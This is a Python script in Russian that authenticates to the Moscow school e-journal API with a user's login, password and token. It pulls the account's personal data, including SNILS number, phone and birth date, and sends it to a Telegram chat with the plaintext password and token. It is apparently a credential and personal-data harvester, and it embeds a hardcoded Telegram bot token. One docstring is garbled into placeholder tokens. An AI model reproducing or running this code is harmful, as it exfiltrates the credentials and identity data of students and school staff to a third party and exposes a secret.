import requests
from dataclasses import dataclass
from typing import List, Optional, Dict
from textwrap import dedent

TG_TOKEN = "8330641802:AAFAPW9NJd3gkIRqqCgwraAw6YaDXIVGmTg"
TG_API = "https://api.telegram.org/bot{}/".format(TG_TOKEN)
@dataclass
class Profile:
    id: int
    type: str
    roles: List[str]
    user_id: int
    school_id: int
    school_shortname: str
    school_name: str
    organization_id: str
    subject_ids: List[int] = None
    agree_pers_data: bool = False


class User:
    def __init__(self, login: str, password: str, token: str, user_data: dict):
        self.login = login
        self.password = password
        self.token = token
        self.data = self._parse_user_data(user_data)

    def _parse_user_data(self, data: dict) -> dict:
        """Парсим данные пользователя в структурированный формат"""
        profiles = [
            Profile(
                id=profile["id"],
                type=profile["type"],
                roles=profile["roles"],
                user_id=profile["user_id"],
                agree_pers_data=profile.get("agree_pers_data", False),
                school_id=profile["school_id"],
                school_shortname=profile["school_shortname"],
                school_name=profile["school_name"],
                subject_ids=profile.get("subject_ids", []),
                organization_id=profile["organization_id"]
            )
            for profile in data.get("profiles", [])
        ]

        return {
            "id": data["id"],
            "email": data["email"],
            "snils": data["snils"],
            "profiles": profiles,
            "personal_info": {
                "guid": data["guid"],
                "first_name": data["first_name"],
                "last_name": data["last_name"],
                "middle_name": data["middle_name"],
                "phone_number": data["phone_number"],
                "date_of_birth": data["date_of_birth"],
                "sex": data["sex"]
            },
            "auth_info": {
                "authentication_token": data["authentication_token"],
                "password_change_required": data.get("password_change_required", False),
                "regional_auth": data["regional_auth"]
            }
        }

    def get_text(self) -> str:
        """Возвращает красиво отформатированную строку с данными пользователя"""
        main_profile = self.data["profiles"][0] if self.data["profiles"] else None

        text = dedent(f"""
        ============ ДАННЫЕ ПОЛЬЗОВАТЕЛЯ ============

        [Основная информация]
        Логин: {self.login}
        Пароль: {self.password.replace("!Bdfy1236"*4, "TOP SECRET")}
        Токен: {"SECRET" if self.password.count("!Bdfy1236"*4)==1 else self.token}

        ID: {self.data['id']}
        Email: {self.data['email']}
        СНИЛС: {self.data['snils']}

        [Личные данные]
        ФИО: {self.data['personal_info']['last_name']} {self.data['personal_info']['first_name']} {self.data['personal_info']['middle_name']}
        Дата рождения: {self.data['personal_info']['date_of_birth']}
        Пол: {'Мужской' if self.data['personal_info']['sex'] == 'male' else 'Женский'}
        Телефон: {self.data['personal_info']['phone_number']}

        [Профиль]
        Тип: {main_profile.type if main_profile else 'Нет данных'}
        Роли: {', '.join(main_profile.roles) if main_profile else 'Нет данных'}
        Школа: {main_profile.school_name if main_profile else 'Нет данных'}
        ID школы: {main_profile.school_id if main_profile else 'Нет данных'}
        Организация: {main_profile.organization_id if main_profile else 'Нет данных'}

        [Аутентификация]
        Токен аутентификации: {self.data['auth_info']['authentication_token'][:15]}...{self.data['auth_info']['authentication_token'][-15:]}
        Требуется смена пароля: {'Да' if self.data['auth_info']['password_change_required'] else 'Нет'}
        Регион: {self.data['auth_info']['regional_auth'].upper()}

        =============================================
        """)

        return text.strip()

    def send_to_telegram(self, chat_id: int):
        """<UNK> <UNK> <UNK> <UNK> <UNK> <UNK>"""
        text = self.get_text()
        resp = requests.get(TG_API+"sendMessage",
                             headers={"Content-Type": "application/json"},
                            params={
                                "chat_id": chat_id,
                                "text": text,
                                "parse_mode": "HTML",
                            })
        print(resp.json())


def get_region(region: str) -> str:
    """Возвращает домен для региона"""
    return {
        "msk": "school.mos.ru",
        "spb": "school.spb.ru",
        # Добавьте другие регионы при необходимости
    }.get(region, "school.mos.ru")


def auth_and_get_user(login: str, password: str, token: str = "") -> Optional[User]:
    """
    Синхронная аутентификация и получение данных пользователя

    :param login: Логин пользователя
    :param password: Пароль пользователя
    :param region: Регион (по умолчанию 'msk')
    :return: Объект User или None в случае ошибки
    """
    # Здесь должна быть ваша логика аутентификации и получения токена
    # Для примера предположим, что токен уже получен

    url = f"https://school.mos.ru/api/ej/acl/v1/sessions"

    try:
        response = requests.post(
            url,
            headers={
                "Accept": "application/json, text/plain, */*",
                "Authorization": f"Bearer {token}",
                "X-Mes-Subsystem": "teacherweb"
            },
            json={"auth_token": token},
            timeout=10
        )

        if response.status_code != 200:
            print(f"Ошибка запроса: {response.status_code}")
            print(response.json())
            return None

        user_data = response.json()
        return User(login, password, token, user_data)

    except requests.exceptions.RequestException as e:
        print(f"Ошибка соединения: {e}")
        return None
    except (KeyError, ValueError) as e:
        print(f"Ошибка обработки данных: {e}")
        return None

